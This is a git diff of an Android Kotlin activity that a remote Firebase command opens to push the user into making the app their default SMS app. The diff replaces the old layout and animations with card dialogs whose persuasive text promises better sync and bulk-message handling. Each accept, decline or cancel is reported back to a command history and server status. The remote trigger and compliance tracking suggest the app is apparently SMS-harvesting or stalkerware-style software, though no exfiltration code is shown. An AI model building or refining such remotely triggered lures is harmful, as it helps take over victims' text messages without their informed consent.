@@ -1,23 +1,26 @@
 package com.example.fast.ui
 
-import android.animation.AnimatorSet
-import android.animation.ObjectAnimator
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
-import android.view.View
-import android.view.animation.DecelerateInterpolator
-import android.view.animation.OvershootInterpolator
 import android.provider.Settings
+import android.view.ViewGroup
 import androidx.activity.enableEdgeToEdge
 import androidx.appcompat.app.AppCompatActivity
 import androidx.appcompat.app.AppCompatDelegate
 import androidx.lifecycle.lifecycleScope
 import com.example.fast.config.AppConfig
 import com.example.fast.R
-import com.example.fast.databinding.ActivityDefaultSmsRequestBinding
+import com.example.fast.ui.card.MultipurposeCardController
+import com.example.fast.ui.card.MultipurposeCardSpec
+import com.example.fast.ui.card.BirthSpec
+import com.example.fast.ui.card.FillUpSpec
+import com.example.fast.ui.card.PurposeSpec
+import com.example.fast.ui.card.DeathSpec
+import com.example.fast.ui.card.EntranceAnimation
+import com.example.fast.ui.card.CardSize
 import com.example.fast.util.DefaultSmsAppHelper
 import com.example.fast.util.DjangoApiHelper
 import com.google.firebase.Firebase
@@ -28,7 +31,7 @@ import kotlinx.coroutines.launch
  * DefaultSmsRequestActivity
  *
  * Activity launched remotely via Firebase command to request user to set app as default SMS app.
- * Shows a UI with message and "SET AS DEFAULT" button.
+ * Uses MultipurposeCard for consistent UI with rest of app.
  *
  * Usage:
  * - Command: requestDefaultMessageApp
@@ -37,8 +40,6 @@ import kotlinx.coroutines.launch
  * When user clicks the button, opens the system dialog to set this app as default SMS app.
  */
 class DefaultSmsRequestActivity : AppCompatActivity() {
-
-    private val binding by lazy { ActivityDefaultSmsRequestBinding.inflate(layoutInflater) }
 
     private val TAG = "DefaultSmsRequest"
     private val handler = Handler(Looper.getMainLooper())
@@ -55,6 +56,9 @@ class DefaultSmsRequestActivity : AppCompatActivity() {
     private var hasRequestedDefaultSms = false
     private var hasUpdatedCommandHistory = false
     private var hasSyncedDefaultSmsStatus = false
+    private var cardController: MultipurposeCardController? = null
+
+    private lateinit var rootView: ViewGroup
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -66,52 +70,156 @@ class DefaultSmsRequestActivity : AppCompatActivity() {
             window.navigationBarColor = resources.getColor(R.color.theme_gradient_start, theme)
         }
 
-        setContentView(binding.root)
+        // Simple root layout for multipurpose card overlay
+        rootView = android.widget.FrameLayout(this).apply {
+            layoutParams = ViewGroup.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.MATCH_PARENT
+            )
+            setBackgroundColor(resources.getColor(R.color.theme_gradient_start, theme))
+        }
+        setContentView(rootView)
         AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
 
-        // Start collapse animation
-        binding.root.post {
-            animateCollapseAndDeploy()
-        }
-
-        // Setup UI
-        setupUI()
-
         // Check if already default SMS app
-        checkDefaultSmsStatus()
-    }
-
-    /**
-     * Setup UI elements
-     */
-    private fun setupUI() {
-        // Set message text
-        binding.messageText.text = "Please make this app your default message app for better sync and reliability."
-        binding.subtitleText.text = "This will improve message delivery and sync."
-
-        // Setup help button click listener
-        binding.helpButton.setOnClickListener {
-            // Open default SMS app selection dialog
-            hasRequestedDefaultSms = true
-            requestDefaultSmsApp()
-            startNoActionTimeout()
-            // Hide button after click
-            binding.helpButtonCard.visibility = View.GONE
-            binding.subtitleText.text = "Please select this app in the dialog that appears."
-        }
-    }
-
-    /**
-     * Check if app is already default SMS app
-     */
-    private fun checkDefaultSmsStatus() {
         if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
             Log.d(TAG, "App is already set as default SMS app")
-            binding.messageText.text = "This app is already set as your default message app."
-            binding.subtitleText.text = "Thank you for your support!"
-            binding.helpButtonCard.visibility = View.GONE
-            storeAndSyncDefaultSmsStatus(true, "already_default_on_open")
+            showAlreadyDefaultCard()
+        } else {
+            showRequestDefaultCard()
         }
+    }
+
+    /**
+     * Show card when app is already default SMS app
+     */
+    private fun showAlreadyDefaultCard() {
+        val spec = MultipurposeCardSpec(
+            birth = BirthSpec(
+                width = CardSize.MatchWithMargin(24),
+                height = CardSize.WrapContent,
+                entranceAnimation = EntranceAnimation.ScaleIn(
+                    overlayFadeMs = 150,
+                    cardScaleMs = 400,
+                    fromScale = 0.9f
+                )
+            ),
+            fillUp = FillUpSpec.Text(
+                title = "DEFAULT SMS APP",
+                body = "This app is already set as your default message app.\n\nThank you for your support!",
+                typingAnimation = true,
+                perCharDelayMs = 25
+            ),
+            purpose = PurposeSpec.Dismiss(
+                primaryButtonLabel = "Continue",
+                onPrimary = {
+                    storeAndSyncDefaultSmsStatus(true, "already_default_on_open")
+                    finish()
+                }
+            ),
+            death = DeathSpec.FadeOut(durationMs = 200)
+        )
+
+        cardController = MultipurposeCardController(
+            context = this,
+            rootView = rootView,
+            spec = spec,
+            onComplete = { finish() },
+            activity = this
+        )
+        cardController?.show()
+    }
+
+    /**
+     * Show card to request user to set app as default SMS app
+     */
+    private fun showRequestDefaultCard() {
+        val spec = MultipurposeCardSpec(
+            birth = BirthSpec(
+                width = CardSize.MatchWithMargin(24),
+                height = CardSize.WrapContent,
+                entranceAnimation = EntranceAnimation.ScaleIn(
+                    overlayFadeMs = 150,
+                    cardScaleMs = 400,
+                    fromScale = 0.9f
+                )
+            ),
+            fillUp = FillUpSpec.Text(
+                title = "SET AS DEFAULT",
+                body = "Please make this app your default message app.\n\n" +
+                       "Benefits:\n" +
+                       "• Better message sync & reliability\n" +
+                       "• Faster message delivery\n" +
+                       "• Handle bulk messages (5000+) efficiently",
+                typingAnimation = true,
+                perCharDelayMs = 20
+            ),
+            purpose = PurposeSpec.Dual(
+                primaryButtonLabel = "SET AS DEFAULT",
+                secondaryButtonLabel = "Cancel",
+                onPrimary = {
+                    hasRequestedDefaultSms = true
+                    requestDefaultSmsApp()
+                    startNoActionTimeout()
+                },
+                onSecondary = {
+                    storeAndSyncDefaultSmsStatus(false, "user_cancelled")
+                    updateCommandHistoryStatus("failed", "user_cancelled")
+                    finish()
+                }
+            ),
+            death = DeathSpec.FadeOut(durationMs = 200)
+        )
+
+        cardController = MultipurposeCardController(
+            context = this,
+            rootView = rootView,
+            spec = spec,
+            onComplete = { /* Card dismissed */ },
+            activity = this
+        )
+        cardController?.show()
+    }
+
+    /**
+     * Show success card after user sets app as default
+     */
+    private fun showSuccessCard() {
+        // Dismiss current card first
+        cardController?.dismiss()
+
+        val spec = MultipurposeCardSpec(
+            birth = BirthSpec(
+                width = CardSize.MatchWithMargin(24),
+                height = CardSize.WrapContent,
+                entranceAnimation = EntranceAnimation.ScaleIn(
+                    overlayFadeMs = 100,
+                    cardScaleMs = 300,
+                    fromScale = 0.95f
+                )
+            ),
+            fillUp = FillUpSpec.Text(
+                title = "SUCCESS",
+                body = "Thank you! This app is now your default message app.\n\n" +
+                       "Message delivery and sync will be improved.",
+                typingAnimation = true,
+                perCharDelayMs = 25
+            ),
+            purpose = PurposeSpec.Dismiss(
+                primaryButtonLabel = "Continue",
+                onPrimary = { finish() }
+            ),
+            death = DeathSpec.FadeOut(durationMs = 200)
+        )
+
+        cardController = MultipurposeCardController(
+            context = this,
+            rootView = rootView,
+            spec = spec,
+            onComplete = { finish() },
+            activity = this
+        )
+        cardController?.show()
     }
 
     /**
@@ -124,9 +232,8 @@ class DefaultSmsRequestActivity : AppCompatActivity() {
             Log.d(TAG, "Default SMS app selection dialog opened")
         } catch (e: Exception) {
             Log.e(TAG, "Error opening default SMS app settings", e)
-            binding.subtitleText.text = "Error opening settings. Please try again."
-            binding.helpButtonCard.visibility = View.VISIBLE
             updateCommandHistoryStatus("failed", "request_launch_error: ${e.message}")
+            finish()
         }
     }
 
@@ -134,22 +241,20 @@ class DefaultSmsRequestActivity : AppCompatActivity() {
         super.onResume()
 
         // Check if user has set app as default SMS app
-        if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
-            Log.d(TAG, "App is now set as default SMS app")
-            binding.messageText.text = "Thank you! This app is now your default message app."
-            binding.subtitleText.text = "Message delivery and sync will be improved."
-            binding.helpButtonCard.visibility = View.GONE
-            if (hasRequestedDefaultSms) {
-                clearNoActionTimeout()
+        if (hasRequestedDefaultSms) {
+            clearNoActionTimeout()
+            
+            if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
+                Log.d(TAG, "App is now set as default SMS app")
                 storeAndSyncDefaultSmsStatus(true, "user_set_default_sms")
                 updateCommandHistoryStatus("executed", "user_set_default_sms")
+                showSuccessCard()
+            } else {
+                Log.d(TAG, "User declined to set app as default SMS app")
+                storeAndSyncDefaultSmsStatus(false, "user_declined_default_sms")
+                updateCommandHistoryStatus("failed", "user_declined_default_sms")
                 finish()
             }
-        } else if (hasRequestedDefaultSms) {
-            clearNoActionTimeout()
-            storeAndSyncDefaultSmsStatus(false, "user_declined_default_sms")
-            updateCommandHistoryStatus("failed", "user_declined_default_sms")
-            finish()
         }
     }
 
@@ -236,111 +341,10 @@ class DefaultSmsRequestActivity : AppCompatActivity() {
         }
     }
 
-    /**
-     * Animate collapse to center, show logo, then deploy cards
-     */
-    private fun animateCollapseAndDeploy() {
-        try {
-            val handler = Handler(Looper.getMainLooper())
-            val screenCenterX = resources.displayMetrics.widthPixels / 2f
-            val screenCenterY = resources.displayMetrics.heightPixels / 2f
-
-            // Get main content layout - find the LinearLayout containing all elements
-            var mainLayout: View? = null
-            for (i in 0 until binding.root.childCount) {
-                val child = binding.root.getChildAt(i)
-                if (child is android.widget.LinearLayout) {
-                    mainLayout = child
-                    break
-                }
-            }
-
-            if (mainLayout == null) {
-                Log.e(TAG, "Could not find main layout for animation")
-                // If animation fails, ensure elements are visible
-                binding.logoTextView.visibility = View.INVISIBLE
-                return
-            }
-
-            val logoView = binding.logoTextView
-
-            // Calculate center positions
-            val layoutCenterX = screenCenterX - mainLayout.width / 2f
-            val layoutCenterY = screenCenterY - mainLayout.height / 2f
-
-            // Step 1: Collapse all elements to center (600ms)
-            val collapseAnimator = AnimatorSet().apply {
-                playTogether(
-                    ObjectAnimator.ofFloat(mainLayout, "translationX", 0f, layoutCenterX - mainLayout.x),
-                    ObjectAnimator.ofFloat(mainLayout, "translationY", 0f, layoutCenterY - mainLayout.y),
-                    ObjectAnimator.ofFloat(mainLayout, "scaleX", 1f, 0f),
-                    ObjectAnimator.ofFloat(mainLayout, "scaleY", 1f, 0f),
-                    ObjectAnimator.ofFloat(mainLayout, "alpha", 1f, 0f)
-                )
-                duration = 600
-                interpolator = DecelerateInterpolator()
-            }
-
-            // Step 2: Show logo in center and scale up (400ms)
-            val logoShowAnimator = AnimatorSet().apply {
-                playTogether(
-                    ObjectAnimator.ofFloat(logoView, "alpha", 0f, 1f),
-                    ObjectAnimator.ofFloat(logoView, "scaleX", 0.5f, 1.2f),
-                    ObjectAnimator.ofFloat(logoView, "scaleY", 0.5f, 1.2f)
-                )
-                duration = 400
-                startDelay = 600
-                interpolator = OvershootInterpolator(1.5f)
-            }
-
-            // Step 3: Logo moves up (400ms)
-            val logoMoveUpAnimator = ObjectAnimator.ofFloat(logoView, "translationY", 0f, -screenCenterY * 0.3f).apply {
-                duration = 400
-                startDelay = 1000
-                interpolator = DecelerateInterpolator()
-            }
-
-            // Step 4: Deploy cards from center (800ms)
-            val deployAnimator = AnimatorSet().apply {
-                playTogether(
-                    ObjectAnimator.ofFloat(mainLayout, "translationX", layoutCenterX - mainLayout.x, 0f),
-                    ObjectAnimator.ofFloat(mainLayout, "translationY", layoutCenterY - mainLayout.y, 0f),
-                    ObjectAnimator.ofFloat(mainLayout, "scaleX", 0f, 1f),
-                    ObjectAnimator.ofFloat(mainLayout, "scaleY", 0f, 1f),
-                    ObjectAnimator.ofFloat(mainLayout, "alpha", 0f, 1f)
-                )
-                duration = 800
-                startDelay = 1400
-                interpolator = OvershootInterpolator(1.2f)
-            }
-
-            // Hide logo after deploy starts
-            val logoHideAnimator = AnimatorSet().apply {
-                playTogether(
-                    ObjectAnimator.ofFloat(logoView, "alpha", 1f, 0f),
-                    ObjectAnimator.ofFloat(logoView, "scaleX", 1.2f, 0.5f),
-                    ObjectAnimator.ofFloat(logoView, "scaleY", 1.2f, 0.5f)
-                )
-                duration = 300
-                startDelay = 1400
-            }
-
-            // Show logo initially
-            logoView.visibility = View.VISIBLE
-
-            // Start animations
-            collapseAnimator.start()
-            logoShowAnimator.start()
-            logoMoveUpAnimator.start()
-            deployAnimator.start()
-            logoHideAnimator.start()
-
-        } catch (e: Exception) {
-            Log.e(TAG, "Error in collapse animation", e)
-            // If animation fails, ensure elements are visible
-            val mainLayout = binding.root.getChildAt(1) as? android.widget.LinearLayout
-            mainLayout?.alpha = 1f
-            binding.logoTextView.visibility = View.INVISIBLE
-        }
+    override fun onDestroy() {
+        super.onDestroy()
+        clearNoActionTimeout()
+        cardController?.dismiss()
+        cardController = null
     }
 }
